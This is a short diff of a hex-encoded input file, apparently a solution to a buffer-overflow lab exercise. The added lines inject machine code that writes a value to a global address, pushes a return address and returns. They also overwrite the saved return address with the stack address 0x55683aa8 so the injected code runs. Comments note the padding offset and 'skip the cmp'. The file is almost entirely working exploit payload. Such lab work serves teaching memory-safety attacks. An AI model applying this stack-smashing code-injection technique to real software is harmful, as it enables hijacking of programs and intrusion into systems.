@@ -1,7 +1,7 @@
-30 31 32 33
-34 35 36 37
-30 31 32 33
-34 35 36 37
+b8 1d fd 3d 7e       /*	mov    $0x7e3dfd1d,%eax	*/
+a3 00 d1 04 08       /*	mov    %eax,0x804d100	*/
+68 9d 8c 04 08       /*	push   $0x8048c9d	*/
+c3                   /*	ret    			*/
 30 31 32 33
 34 35 36 37
 30 31 32 33 /* base addr in 0x55683aa8 <_r+1039016> */
@@ -9,4 +9,4 @@
 30 31 32 33 /* so there are needs 44(de) bytes to get the addr */
 34 35 36 37 
 30 31 32 33 
-b0 8c 04 08 /* just skip the cmp */
+a8 3a 68 55 /* just skip the cmp */
